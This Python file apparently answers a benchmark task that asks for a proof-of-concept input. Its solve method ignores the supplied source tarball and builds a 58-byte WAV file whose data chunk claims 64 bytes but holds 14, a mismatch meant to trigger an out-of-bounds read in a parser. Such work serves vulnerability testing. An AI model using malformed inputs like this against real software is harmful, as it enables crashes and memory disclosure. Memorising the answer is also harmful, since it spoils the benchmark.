import os
import tarfile
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Optionally touch the tarball to comply with interface; ignore any errors.
        try:
            if src_path and os.path.isfile(src_path):
                with tarfile.open(src_path, 'r:*'):
                    pass
        except Exception:
            pass
        return self._build_wav_poc()

    def _build_wav_poc(self) -> bytes:
        data = bytearray()

        # RIFF header
        data.extend(b'RIFF')
        riff_size = 58 - 8  # file_size - 8
        data.extend(struct.pack('<I', riff_size))
        data.extend(b'WAVE')

        # fmt chunk
        data.extend(b'fmt ')
        data.extend(struct.pack('<I', 16))  # fmt chunk size
        data.extend(struct.pack('<H', 1))   # Audio format: PCM
        data.extend(struct.pack('<H', 1))   # Channels: 1
        sample_rate = 8000
        data.extend(struct.pack('<I', sample_rate))
        byte_rate = sample_rate * 1 * 16 // 8
        data.extend(struct.pack('<I', byte_rate))
        block_align = 1 * 16 // 8
        data.extend(struct.pack('<H', block_align))
        data.extend(struct.pack('<H', 16))  # Bits per sample

        # data chunk with inconsistent size
        data.extend(b'data')
        data_size = 64  # Larger than actual payload to trigger OOB read
        data.extend(struct.pack('<I', data_size))

        # Actual payload smaller than declared data_size
        data.extend(b'\x00' * 14)

        return bytes(data)